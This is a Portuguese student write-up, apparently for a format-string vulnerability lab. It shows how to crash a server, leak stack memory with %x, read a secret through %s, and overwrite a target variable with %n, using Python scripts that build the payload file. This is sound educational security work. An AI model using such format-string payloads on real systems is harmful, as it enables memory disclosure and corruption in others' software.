### Task 1

Ao ler 'hello' de input:

![hello](https://user-images.githubusercontent.com/123839132/231914295-4263fe2a-b4c6-4131-b0b1-d9af5f97254b.png)
![hello_result](https://user-images.githubusercontent.com/123839132/231913955-0a896828-834d-4b75-8ac8-b5d9d6be88e7.png)

Isto significa que correu tudo como esperado.

O nosso objetivo é fornecer um input ao servidor de tal forma que quando o servidor tenta imprimir o input usando a função myprintf vai crashar.Se não retornar "Returned Properly" significa que o programa crashou.

Ao ler '%s' de input:

![echo_command](https://user-images.githubusercontent.com/123839132/231913242-f7b24029-b042-47c5-a195-f99b2b672ab1.png)
![result](https://user-images.githubusercontent.com/123839132/231913246-427c4b28-7b48-417c-aca3-9dd87224a743.png)

Para resolver esta tarefa, só precisámos fornecer "%s" como entrada para o servidor e o programa crasha com sucesso. Isto acontece porque a chamada printf() com %s requer que o argumento seja um ponteiro para um array de char, mas nesta chamada nenhum argumento é fornecido. Assim,a função tentará imprimir o primeiro elemento da pilha, mas como o primeiro elemento da pilha não é uma string, o programa crasha.

### Task 2
#### Task 2.a

O input de 4 bytes que decidimos escrever foi "AAAA" de forma a ser mais fácil identificar (0x41414141). Assim, o objetivo foi procurar por este último valor no nosso output para saber exatamente quantos especificadores de formato %x precisavamos. 
Após algumas tentivas, acabamos por perceber que precisávamos de 64%x para imprimir o nosso input.

![task2a_echo](https://user-images.githubusercontent.com/123839132/232046635-7654aad2-0ae9-4be1-8dc8-aa936b97856c.png)
![Task2a_result](https://user-images.githubusercontent.com/123839132/232046650-860400c9-2637-418d-88ea-d46df73c964c.png)

Como já sabiamos que apenas precisávamos de 64%x para imprimir o nosso input, reduzimos o número de %x para verificar se o último endereço impresso seria o pretendido.
![Task2_echo_quantidade_certa](https://user-images.githubusercontent.com/123839132/232046699-55e293b4-4cdb-45cf-8395-39954dd6942b.png)
![Task2a_result_quanti_certa](https://user-images.githubusercontent.com/123839132/232046710-30e05d49-beab-4268-a6d0-89f3de2e4c68.png)

#### Task 2.b

Depois de saber a localização dos primeiros 4 bytes de nossa entrada, para obter a mensagem secreta, basta adicionar o endereço da mensagem secreta à string, seguido da quantidade certa de %x, para ir para o endereço correto da stack. Depois, precisamos adicionar um %s para que imprima o valor daquele endereço de memória, assim:

``number  = 0x080b4008``

``s = "\x08\x40\x0b\x08" + ".%x"*63 + "%s"``

Obtendo o seguinte:

![Screenshot from 2023-04-14 17-00-27](https://user-images.githubusercontent.com/124071367/232096042-a2cd709b-7687-47d5-904f-ad1be45b1620.png)

### Task 3
#### Task 3.a

Para modificar o valor do target, basta aplicar a mesma lógica que fizemos para mostrar a mensagem secreta na Task anterior. Primeiramente, precisamos converter o endereço do alvo ``number  = 0x080e5068`` para Little-Endian, seguido de uma certa quantidade de %x.
A única diferença é que agora, invés de querer ver a string, dada pelo %s, queremos modificar o valor, tendo que substituir o %s por um %n.

``s = "\x68\x50\x0e\x08" + ".%x"*63 + "%n\n"``

![Screenshot from 2023-04-14 17-21-49](https://user-images.githubusercontent.com/124071367/232100926-92bc0367-620e-4663-bbe4-62098b274818.png)

Depois de executar o script, alteramos o valor com sucesso
![Screenshot from 2023-04-14 17-13-41](https://user-images.githubusercontent.com/124071367/232099228-44cb2ba0-6285-42a2-8cab-bfd2acc87e95.png)


#### Task 3.b

``Para este exercício encontramos duas formas de resolução um pouco distintas.``

O objetivo desta tarefa era alterarmos o valor de destino para 0x5000. Também sabemos que para para conseguirmos “alterar” o valor de ``0x5000`` precisamos de imprimir 20480 caracteres ( Valor do 0x5000 em hexadecimal) antes do “%n”.

##### 1ªresolução:

Como a variável number e abcd ocupam, cada um, 4 bytes como diz em comentário no código, começamos por fazer 20480 - 8 = 20472. Depois como a nossa string dada como input ocupa 4 bytes subtraimos 4 a 20472 que dá 20468. Portanto, para imprimir 0x5000 (20480), precisamos que cada chamada %x tenha uma precisão de 330 (20468/62 = 330.12) caracteres e mais  8 caracteres , uma vez que 20468 - 330 * 62 = 8.

```ruby
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0x080e5068
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to store a 4-byte string at offset 4
content[4:8]  =  ("abcd").encode('latin-1')

# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%n"
s = "\x68\x50\x0e\x08" + "%.330x" * 62 + "%.8x" + "%n\n"

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[8:8+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

![Screenshot from 2023-04-14 23-06-10](https://user-images.githubusercontent.com/124071367/232166327-a8084e54-20c8-485a-a456-149b037b1103.png)

##### 2ªresolução:

O numero máximo de caracteres que podemos inserir é 1500, devido ao buffer. 

```ruby
#!/usr/bin/python3
import sys

N = 1500
content = bytearray(0x0 for i in range(N))

number  = 0x080e5068
content[0:4]  =  (number).to_bytes(4,byteorder='little')

content[4:8]  =  ("abcd").encode('latin-1')

s = "%.10x"*62 + "%.19852x" + "%n\n" 

fmt  = (s).encode('latin-1')
content[8:8+len(fmt)] = fmt

with open('badfile', 'wb') as f:
  f.write(content)
```

- Usamos o "%.10x" para imprimir cada valor hexadecimal com uma largura mínima de 10, escolhemos este valor por causa da quantidade de caracteres do "number".
- "%.10x * 62 = 620 e então subtraindo ao numero de caracteres que temos que imprimir obtemos 19860.
- A esse valor subtraímos 8 , devido aos bytes já utilizados na nossa memória, sobrando 19852 caracteres.

![terminal](https://user-images.githubusercontent.com/123839132/232353134-0b6ff215-91ff-4e25-bd00-df51f3b4f0a8.png)
